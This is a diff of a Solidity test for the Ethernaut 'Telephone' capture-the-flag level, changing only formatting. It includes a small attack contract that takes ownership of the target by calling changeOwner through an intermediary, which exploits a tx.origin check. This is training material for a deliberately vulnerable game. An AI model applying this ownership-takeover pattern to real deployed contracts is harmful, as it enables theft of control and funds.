@@ -13,9 +13,9 @@ import {Ethernaut} from "src/Ethernaut.sol";
 contract TelephoneAttack {
     Telephone public telephone;
 
-    constructor(address _telephoneContract)  {
+    constructor(address _telephoneContract) {
         telephone = Telephone(_telephoneContract);
-    }   
+    }
     function attack(address _newOwner) external payable {
         telephone.changeOwner(_newOwner);
     }
@@ -49,14 +49,20 @@ contract TestTelephoneSolution is Test, Utils {
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Telephone(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
-        
+        instance = Telephone(
+            payable(
+                createLevelInstance(
+                    ethernaut,
+                    Level(address(factory)),
+                    0.001 ether
+                )
+            )
+        );
+
         // deploy attack contract
         telephoneAttack = new TelephoneAttack(address(instance));
         vm.stopPrank();
     }
-
-    
 
     /*//////////////////////////////////////////////////////////////
                                  TESTS
